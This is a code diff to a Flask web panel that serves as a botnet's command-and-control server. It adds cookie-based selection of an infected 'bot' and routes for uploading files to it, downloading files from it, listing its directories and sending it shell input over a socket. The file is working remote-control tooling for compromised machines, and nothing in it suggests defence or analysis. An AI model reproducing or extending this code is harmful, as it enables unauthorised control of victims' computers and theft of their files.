@@ -1,6 +1,7 @@
 import os
 import socket
 from flask import Flask, render_template, session, request, Response, stream_with_context
+from flask import make_response
 from flask_socketio import SocketIO, emit
 from functools import wraps
 import importlib
@@ -19,7 +20,6 @@ except:
 
 HOST = 'localhost'
 PORT = 1708
-connected = ''  # temp variable for testing
 UPLOAD_FOLDER = 'static/uploads/'  # TODO
 CLIENT_FILE = '../client/client.py' # TODO
 
@@ -55,7 +55,8 @@ def upload_file():
     if request.method == 'POST':
         f = request.files['file']
         # Starts forwarding file to client on separate thread, never saved locally (at least in non-temp file)
-        botnet.sendFile(connected,f.filename,f)
+        if 'bot' in request.cookies:
+            botnet.sendFile(request.cookies.get('bot'),f.filename,f)
         # TODO switch to in-progress instead of "success"
         return json.dumps({"success": True})
 
@@ -63,11 +64,16 @@ def upload_file():
 def download_file():
     if request.method == 'POST':
         filename = request.form.get('file')
-        response= Response(stream_with_context(botnet.startFileDownload(connected,filename)))
-        # Set the right header for the response
-        # to be downloaded, instead of just printed on the browser
-        # response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
-        return response
+        if 'bot' in request.cookies:
+            response = Response(stream_with_context(
+                botnet.startFileDownload(
+                    request.cookies.get('bot'),filename)))
+            # Set the right header for the response
+            # to be downloaded, instead of just printed on the browser
+            # response.headers["Content-Disposition"] = "attachment; filename={}".format(filename)
+            return response
+        else:
+            return "No bot selected", 404
 
 @app.route('/ls', methods=['GET','POST'])
 def list_dir():
@@ -75,8 +81,11 @@ def list_dir():
         filename = request.form.get('file')
     else:
         filename = '.'
-    botnet.requestLs(connected, filename)
-    return "done"
+    if 'bot' in request.cookies:
+        botnet.requestLs(request.cookies.get('bot'), filename)
+        return "done"
+    else:
+        return "No bot selected", 404
 
 def requires_auth(f):
     @wraps(f)
@@ -91,11 +100,16 @@ def requires_auth(f):
 @app.route('/', methods=['GET', 'POST'])
 @requires_auth
 def index():
-    global connected
+    connected = ''
+    if 'bot' in request.cookies:
+        connected = request.cookies.get('bot')
+    resp = make_response(render_template('index.html',
+                                         async_mode=socketio.async_mode,
+                                         bot_list=botnet.getConnections(),
+                                         connected=connected))
     if request.method == 'POST':
-        connected = request.form.get('bot')
-    return render_template('index.html', async_mode=socketio.async_mode, bot_list=botnet.getConnections(),
-                           connected=connected)
+        resp.set_cookie('bot',request.form.get('bot'))
+    return resp
 
 @app.route('/finder')
 @requires_auth
@@ -105,7 +119,8 @@ def finder():
 
 @socketio.on('send_command', namespace='/bot')
 def send_command(cmd):
-    botnet.sendStdin(connected, cmd['data'] + '\n')
+    if 'bot' in request.cookies:
+        botnet.sendStdin(request.cookies.get('bot'), cmd['data'] + '\n')
 
 if __name__ == "__main__":
     TCPSOCK = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
